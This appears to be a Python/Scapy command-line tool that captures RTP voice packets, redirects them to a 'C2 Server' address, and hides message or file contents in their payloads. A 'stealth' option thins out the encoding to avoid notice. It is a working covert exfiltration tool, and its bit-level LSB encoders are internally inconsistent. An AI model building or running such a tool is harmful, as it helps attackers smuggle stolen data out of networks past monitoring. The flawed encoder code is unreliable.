import argparse
import queue
import scapy.all as scapy
from scapy.all import sendp
from scapy.layers.inet import UDP, IP, Ether
from scapy.packet import Raw
from numba import njit


@njit
def encodeBytes2(rawData, message, bitCounter):
    k = 12  # Audio begins at 12th bit of raw load

    while bitCounter < len(message) << 4 and k < len(rawData):
        # Encode the least significant bit.
        rawData[k] = rawData[k] | 1 if (ord(message[bitCounter >> 4]) >> (bitCounter & 7)) & 1 else rawData[k] & ~1
        bitCounter += 1
        k += 1

    return rawData



def encodePacket2(packet, message, bitCounter):
    rawData = bytearray(packet[Raw].load)
    k = 12  # Audio begins at 12th bit of raw load

    while bitCounter < len(message) << 4 and k < len(rawData):
        # Encode the least significant bit.
        rawData[k] = rawData[k] | 1 if (ord(message[bitCounter >> 4]) >> (bitCounter & 7)) & 1 else rawData[k] & ~1
        bitCounter += 1
        k += 1

    packet[Raw].load = bytes(rawData)
    return packet, bitCounter


def encodePacket(packet, character):
    """
    Encodes the raw data in the given RTP packet with a character. The given character replaces the first byte in the
    RTP payload.
    @param packet: preconfigured Scapy RTP packet
    @param character: the ascii (256bit) character to encode
    @return: the same packet with encoded payload
    """
    rawData = packet[Raw].load
    packet[Raw].load = rawData[:12] + bytes(character, encoding="raw_unicode_escape") + rawData[13:]
    return packet


def changeDestinationIPAndPort(packet, address, port):
    """
    Changes the destination IP address and destination port of a preconfigured Scapy packet.
    @param packet: preconfigured Scapy packet
    @param address: the new destination address
    @param port: the new destination port
    @return: the same packet with the modified fields
    """
    packet[IP].dst = address
    packet[UDP].dport = port
    return packet


def sendPacket(packet):
    """
    Sends an outgoing, preconfigured Scapy packet.
    @param packet: preconfigured Scapy packet
    @return: None
    """
    # Mac Address and Checksums are recomputed with the sendp function.
    del packet[UDP].chksum
    del packet[IP].chksum
    del packet[Ether].dst
    sendp(packet, verbose=0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-m", "--message", help="String message to send.")
    parser.add_argument("-f", "--filename", help="Filename of text message to send.")
    parser.add_argument("-s", "--stealth", default=1, help="Number of packets skipped before next RTP encoding.")
    parser.add_argument("-d", "--destination_address", required=True, help="The C2 Server destination ipv4 address.")
    parser.add_argument("-c", "--C2_listening_port", required=True, help="The C2 Server port we send traffic to.")
    parser.add_argument("-i", "--host_ips", required=True, help="The ipv4 addresses of hosts in the RTP session.")
    args = parser.parse_args()

    stealthVal = int(args.stealth)
    destinationAddress = args.destination_address
    listeningPort = int(args.C2_listening_port)

    print("Input arguments: ", args)  # Debugging

    if args.filename is not None:
        file = open(args.filename, 'r')
        transmissionString = file.read()
        file.close()
    else:
        transmissionString = args.message

    # Create filter
    sessionHostList = args.host_ips.split(",")
    filterString = f"dst host {sessionHostList[0]} "
    for h in sessionHostList[1:]:
        filterString += f"or dst host {h} "

    # Setup packet sniffer
    packetQ = queue.Queue()
    asyncSniffer = scapy.AsyncSniffer(filter=filterString, prn=lambda x: packetQ.put(x))
    asyncSniffer.start()

    # Statistical information for transmission
    encodedPackets = 0
    sentPackets = 0
    percentageDone = 0

    while encodedPackets < len(transmissionString):     # Begin transmission
        if packetQ.qsize() > 0:
            pkt = packetQ.get()
            if pkt.haslayer(IP) and pkt.haslayer(UDP):
                if sentPackets == 0:
                    sendPacket(encodePacket(changeDestinationIPAndPort(pkt, destinationAddress, listeningPort), transmissionString[encodedPackets]))
                    encodedPackets += 1
                    if (100 * encodedPackets) // len(transmissionString) != percentageDone:
                        percentageDone = (100 * encodedPackets) // len(transmissionString)
                        print(f"Percentage complete: {percentageDone}%")
                else:
                    sendPacket(changeDestinationIPAndPort(pkt, destinationAddress, listeningPort))
                sentPackets = (1 + sentPackets) % stealthVal

    asyncSniffer.stop()
